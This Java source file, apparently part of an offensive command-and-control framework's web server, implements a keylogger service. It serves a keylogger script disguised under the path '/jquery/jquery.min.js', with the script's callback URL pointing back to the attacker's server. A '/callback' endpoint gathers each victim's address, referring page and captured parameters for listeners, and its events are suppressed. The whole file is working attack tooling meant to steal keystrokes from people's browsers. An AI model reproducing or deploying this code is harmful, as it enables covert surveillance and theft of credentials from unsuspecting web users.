package cloudstrike;

import profiler.SystemProfiler;

import java.util.*;

public class KeyLogger implements WebService {
    protected String content;
    protected String type;
    protected String desc;
    protected String proto = "";
    protected LinkedList<KeyloggerListener> listeners = new LinkedList<>();

    public void addKeyloggerListener(KeyloggerListener l) {
        this.listeners.add(l);
    }

    public KeyLogger(String content, String type, String desc) {
        this.content = content;
        this.type = type;
        this.desc = desc;
    }

    @Override
    public void setup(WebServer w, String uri) {
        w.register(uri, this);
        w.registerSecondary("/callback", this);
        w.registerSecondary("/jquery/jquery.min.js", this);
        this.proto = w.isSSL() ? "https://" : "http://";
    }

    @Override
    public boolean suppressEvent(String uri) {
        return "/callback".equals(uri);
    }

    public String resource(String resource, String url) {
        StringBuilder temp = new StringBuilder(524288);
        try {
            SystemProfiler.suckItDown(resource, temp);
        } catch (Exception ex) {
            WebServer.logException("Could not get resource: " + resource, ex, false);
        }
        return temp.toString().replace("%URL%", url);
    }

    @Override
    public Response serve(String uri, String method, Properties header, Properties param) {
        if (uri.equals("/jquery/jquery.min.js")) {
            return new Response("200 OK", "text/javascript", this.resource("/resources/keylogger.js", this.proto + header.get("Host") + "/callback"));
        }
        if (uri.equals("/callback")) {
            Iterator i = this.listeners.iterator();
            String who = header.get("REMOTE_ADDRESS") + "";
            String from = header.get("Referer") + "";
            if (who.length() > 1) {
                who = who.substring(1);
            }
            KeyloggerListener l = null;
            while (i.hasNext()) {
                try {
                    l = (KeyloggerListener) i.next();
                    l.slowlyStrokeMe(from, who, param, param.get("id") + "");
                } catch (Exception ex) {
                    WebServer.logException("Listener: " + l + " vs. " + from + ", " + who + ", " + param, ex, false);
                }
            }
            return new Response("200 OK", "text/plain", "");
        }
        return new Response("200 OK", this.type, this.content.replace("%TOKEN%", param.get("id") + ""));
    }

    public String toString() {
        return this.desc;
    }

    @Override
    public String getType() {
        return "page";
    }

    @Override
    public List cleanupJobs() {
        return new LinkedList();
    }

    @Override
    public boolean isFuzzy() {
        return false;
    }

    public interface KeyloggerListener {
        void slowlyStrokeMe(String var1, String var2, Map var3, String var4);
    }

}

